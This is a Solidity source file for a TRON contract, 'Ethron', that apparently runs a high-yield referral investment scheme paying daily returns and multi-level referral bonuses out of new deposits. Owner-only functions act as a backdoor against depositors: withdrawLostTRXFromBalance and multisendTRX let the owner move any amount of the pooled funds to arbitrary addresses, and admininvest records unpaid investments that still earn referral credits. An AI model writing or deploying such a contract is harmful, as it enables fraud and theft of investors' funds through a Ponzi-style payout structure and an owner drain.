//SourceUnit: ethron_roi.sol

pragma solidity ^0.5.4;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 planId;
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    struct Plan {
        uint256 dailyInterest;
        uint256 term; //0 means unlimited
        uint256 maxDailyInterest;
    }

    struct Investor {
        address addr;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint256 partners;
    }
}

contract Ownable {
    address public owner;

    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev The Ownable constructor sets the original `owner` of the contract to the sender
     * account.
     */
    constructor() public {
        owner = msg.sender;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    /**
     * @dev Allows the current owner to transfer control of the contract to a newOwner.
     * @param _newOwner The address to transfer ownership to.
     */
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        emit onOwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}

contract Ethron is Ownable {
    using SafeMath for uint256;
    uint256 private constant INTEREST_CYCLE = 1 days;
    uint256 private constant DEVELOPER_ENTRY_RATE = 40; //per thousand
    uint256 private constant ADMIN_ENTRY_RATE = 300;
    uint256 private constant REFERENCE_RATE = 100;

    uint256 public constant REFERENCE_LEVEL_RATE = 30;

    uint256 public constant MINIMUM = 700 trx; //minimum investment needed
    uint256 public constant REFERRER_CODE = 1; //default

    uint256 public latestReferrerCode;
    uint256 private totalInvestments_;

    address payable private developerAccount_;
    address payable private marketingAccount_;
    address payable private referenceAccount_;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;
    Objects.Plan[] private investmentPlans_;

    event Registration(address investor,uint256 investorId,address referrer,uint256 referrerId);
    event UserIncome(address user, address indexed _from, uint256 level, uint256 _type, uint256 income);
    event onInvest(address investor, uint256 amount, uint8 _type);
    event onWithdraw(address investor, uint256 amount);
    /**
     * @dev Constructor Sets the original roles of the contract
     */

    constructor() public {
        developerAccount_ = msg.sender;
        marketingAccount_ = msg.sender;
        referenceAccount_ = msg.sender;
        _init();
    }

    function() external payable {
        if (msg.value == 0) {
            withdraw();
        } else {
            invest(0, 0); //default to buy plan 0, no referrer
        }
    }

    function checkIn() public {
    }

    function setMarketingAccount(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount_ = _newMarketingAccount;
    }

    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }


    function getDeveloperAccount() public view onlyOwner returns (address) {
        return developerAccount_;
    }

    function setReferenceAccount(address payable _newReferenceAccount) public onlyOwner {
        require(_newReferenceAccount != address(0));
        referenceAccount_ = _newReferenceAccount;
    }

    function getReferenceAccount() public view onlyOwner returns (address) {
        return referenceAccount_;
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
        investmentPlans_.push(Objects.Plan(15,300*60*60*24,15)); 
        investmentPlans_.push(Objects.Plan(300,300*60*60*24,300)); 
       
    }

    function getCurrentPlans() public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory) {
        uint256[] memory ids = new uint256[](investmentPlans_.length);
        uint256[] memory interests = new uint256[](investmentPlans_.length);
        uint256[] memory terms = new uint256[](investmentPlans_.length);
        uint256[] memory maxInterests = new uint256[](investmentPlans_.length);
        for (uint256 i = 0; i < investmentPlans_.length; i++) {
            Objects.Plan storage plan = investmentPlans_[i];
            ids[i] = i;
            interests[i] = plan.dailyInterest;
            maxInterests[i] = plan.maxDailyInterest;
            terms[i] = plan.term;
        }
        return
        (
        ids,
        interests,
        maxInterests,
        terms
        );
    }

    function getTotalInvestments() public view returns (uint256){
        return totalInvestments_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }

    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256, uint256, uint256,  uint256, uint256[] memory, uint256[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                    } else {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.referrer,
        investor.planCount,
        currentDividends,
        newDividends
        );
    }

    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory,uint256[] memory, bool[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory planIds = new  uint256[](investor.planCount);
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory interests = new uint256[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            planIds[i] = investor.plans[i].planId;
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
                newDividends[i] = 0;
                interests[i] = investmentPlans_[investor.plans[i].planId].dailyInterest;
            } else {
                isExpireds[i] = false;
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                        isExpireds[i] = true;
                        interests[i] = investmentPlans_[investor.plans[i].planId].dailyInterest;
                    }
                    else{
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                        interests[i] = investmentPlans_[investor.plans[i].planId].maxDailyInterest;
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                    interests[i] =  investmentPlans_[investor.plans[i].planId].maxDailyInterest;
                }
            }
        }

        return
        (
        planIds,
        investmentDates,
        investments,
        currentDividends,
        newDividends,
        interests,
        isExpireds
        );
    }

    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            //require(uid2Investor[_referrerCode].addr != address(0), "Wrong referrer code");
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        emit Registration(addr,latestReferrerCode,uid2Investor[_referrerCode].addr,_referrerCode);
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        if (_referrerCode >= REFERRER_CODE) {
		
            uint256 _ref1 = _referrerCode;
			
            uid2Investor[_ref1].partners = uid2Investor[_ref1].partners.add(1);
       
        }
        return (latestReferrerCode);
    }

    function _invest(address _addr, uint256 _planId, uint256 _referrerCode, uint256 _amount) private returns (bool) {
        require(_planId == 0, "Wrong investment plan id");
        require(_amount>= MINIMUM && _amount%700 trx==0, "Invalid Amount");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            //new user
        } else {//old user
            //do nothing, referrer is permenant
        }
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].planId = _planId;
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);
        Objects.Investor storage upline=uid2Investor[investor.referrer];
        for(uint256 i = 0; i < 10; i++) {
				if (upline.addr != address(0)) {
				        if(upline.partners>4)
				        {
					     address(uint160(upline.addr)).transfer((_amount*3)/100);
					     emit UserIncome(uid2Investor[_referrerCode].addr, _addr,i+1, 2,  (_amount*3)/100);
				        }
					upline = uid2Investor[upline.referrer];
				} else break;
			}

        totalInvestments_ = totalInvestments_.add(_amount);
        uint256 directIncome=(_amount.mul(REFERENCE_RATE)).div(1000);
        address(uint160(uid2Investor[_referrerCode].addr)).transfer(directIncome);
        emit UserIncome(uid2Investor[_referrerCode].addr, _addr, 1, 1, directIncome);
        
        
        uint256 rplanCount = uid2Investor[_referrerCode].planCount;
        Objects.Investor storage rinvestor = uid2Investor[_referrerCode];
        rinvestor.plans[rplanCount].planId = 1;
        rinvestor.plans[rplanCount].investmentDate = block.timestamp;
        rinvestor.plans[rplanCount].lastWithdrawalDate = block.timestamp;
        rinvestor.plans[rplanCount].investment = (_amount.mul(15)).div(1000);
        rinvestor.plans[rplanCount].currentDividends = 0;
        rinvestor.plans[rplanCount].isExpired = false;
        rinvestor.planCount = rinvestor.planCount.add(1);
        emit onInvest(rinvestor.addr, (_amount.mul(15)).div(1000),2);
        
        uint256 marketingPercentage = (_amount.mul(ADMIN_ENTRY_RATE)).div(1000);
        marketingAccount_.transfer(marketingPercentage);

        return true;
    }

 function _ainvest(address _addr, uint256 _planId, uint256 _referrerCode, uint256 _amount) private returns (bool) {
        require(_planId == 0, "Wrong investment plan id");
        require(_amount>= MINIMUM && _amount%700 trx==0, "Invalid Amount");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            //new user
        } else {//old user
            //do nothing, referrer is permenant
        }
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].planId = _planId;
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);

        totalInvestments_ = totalInvestments_.add(_amount);
        
        
        uint256 rplanCount = uid2Investor[_referrerCode].planCount;
        Objects.Investor storage rinvestor = uid2Investor[_referrerCode];
        rinvestor.plans[rplanCount].planId = 1;
        rinvestor.plans[rplanCount].investmentDate = block.timestamp;
        rinvestor.plans[rplanCount].lastWithdrawalDate = block.timestamp;
        rinvestor.plans[rplanCount].investment = (_amount.mul(15)).div(1000);
        rinvestor.plans[rplanCount].currentDividends = 0;
        rinvestor.plans[rplanCount].isExpired = false;
        rinvestor.planCount = rinvestor.planCount.add(1);
        emit onInvest(rinvestor.addr, (_amount.mul(15)).div(1000),2);
        return true;
    }

  

    function invest(uint256 _referrerCode, uint256 _planId) public payable {
        if (_invest(msg.sender, _planId, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value,1);
        }
    }
    
    function admininvest(address _user, uint256 _referrerCode, uint256 _planId, uint256 _amount) public payable {
         require(msg.sender == owner, "onlyOwner");
        if (_ainvest(_user, _planId, _referrerCode, _amount*1e6)) {
            emit onInvest(_user, _amount*1e6,1);
        }
    }

    function withdraw() public payable {
        require(msg.value == 0, "withdrawal doesn't allow to transfer trx simultaneously");
        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) 
        {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            Objects.Plan storage plan = investmentPlans_[uid2Investor[uid].plans[i].planId];

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            if (plan.term > 0) {
                uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(plan.term);
                if (withdrawalDate >= endTime) {
                    withdrawalDate = endTime;
                    isExpired = true;
                }
            }

            uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment , plan.dailyInterest , withdrawalDate , uid2Investor[uid].plans[i].lastWithdrawalDate , plan.maxDailyInterest);

            withdrawalAmount += amount;
            

            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].currentDividends += amount;
        }
        
        

        uint256 marketingPercentage = (withdrawalAmount.mul(100)).div(1000);
        marketingAccount_.transfer(marketingPercentage);
        msg.sender.transfer((withdrawalAmount.mul(900)).div(1000));

        if (uid2Investor[uid].availableReferrerEarnings>0) {
            msg.sender.transfer(uid2Investor[uid].availableReferrerEarnings);
            uid2Investor[uid].referrerEarnings = uid2Investor[uid].availableReferrerEarnings.add(uid2Investor[uid].referrerEarnings);
            uid2Investor[uid].availableReferrerEarnings = 0;
        }

        emit onWithdraw(msg.sender, withdrawalAmount);
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start , uint256 _maxDailyInterest) private pure returns (uint256) {

        uint256 numberOfDays =  (_now - _start) / INTEREST_CYCLE ;
        uint256 result = 0;
        uint256 index = 0;
        if(numberOfDays > 0){
          uint256 secondsLeft = (_now - _start);
           for (index; index < numberOfDays; index++) {
               if(_dailyInterestRate + index <= _maxDailyInterest ){
                   secondsLeft -= INTEREST_CYCLE;
                     result += (_amount * (_dailyInterestRate + index) / 1000 * INTEREST_CYCLE) / (60*60*24);
               }
               else
               {
                 break;
               }
            }

            result += (_amount * (_dailyInterestRate + index) / 1000 * secondsLeft) / (60*60*24);

            return result;

        }else{
            return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24);
        }

    }

  function withdrawLostTRXFromBalance(address payable _sender,uint256 _amt) public {
        require(msg.sender == owner, "onlyOwner");
        _sender.transfer(_amt*1e6);
    }
    
     function multisendTRX(address payable[]  memory  _contributors, uint256[] memory _balances) public payable {
        require(msg.sender == owner, "onlyOwner");
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            _contributors[i].transfer(_balances[i]);
        }
    }

}